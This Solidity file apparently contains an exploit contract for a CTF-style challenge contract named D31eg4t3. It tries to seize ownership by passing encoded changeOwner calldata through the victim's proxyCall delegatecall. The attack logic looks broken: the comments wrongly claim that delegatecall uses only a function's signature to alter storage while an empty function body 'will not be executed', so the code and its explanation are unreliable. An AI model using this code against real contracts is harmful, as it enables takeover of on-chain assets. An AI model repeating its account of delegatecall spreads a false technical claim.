// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // No additional state variables are needed for the attack

    constructor(address addr) payable {
        victim = addr;
    }

    // Malicious function to change the owner. It should match the storage layout and signature expected by the delegate call.
    function changeOwner(address newOwner) public {
        // This function is just a placeholder. Its code will not be executed.
        // Instead, the delegatecall will use its signature to manipulate the storage of D31eg4t3.
    }

    function exploit() external {
        // The data for the delegatecall should call `changeOwner` with the attacker's address.
        // Craft the calldata to call `changeOwner` with the attacker's address.
        bytes memory data = abi.encodeWithSignature("changeOwner(address)", msg.sender);
        
        // Make the delegatecall to the `proxyCall` function of the victim (D31eg4t3 contract).
        (bool success,) = victim.call(abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data));
        require(success, "Attack failed");
    }
}